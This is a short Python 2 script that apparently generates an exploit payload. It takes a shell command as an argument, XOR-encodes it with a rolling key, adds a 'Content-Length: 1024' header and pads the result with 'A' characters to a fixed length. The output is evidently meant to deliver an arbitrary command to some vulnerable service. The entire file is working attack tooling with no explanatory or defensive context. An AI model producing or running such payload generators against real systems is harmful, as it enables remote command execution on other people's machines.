#!/usr/bin/env python
#coding=utf-8

import sys

def my_w_file(content):
    f = open("payload", "w")
    f.write(content)
    f.close()


def main(command):
    command += "\x00"
    length = 1024
    count_length = length & 0xff
    payload_command = ""
    for x in command:
        payload_command += chr((ord(x) ^ count_length) & 0xff)
        count_length -= ord(x)
    payload_command += chr(count_length & 0xff)
    payload = "Content-Length: " + str(length) + "\n" + payload_command + "A" * (length - len(payload_command) )
    print payload
    #my_w_file(payload)

if __name__ == '__main__':
    if len(sys.argv) == 2:
        main(sys.argv[1])
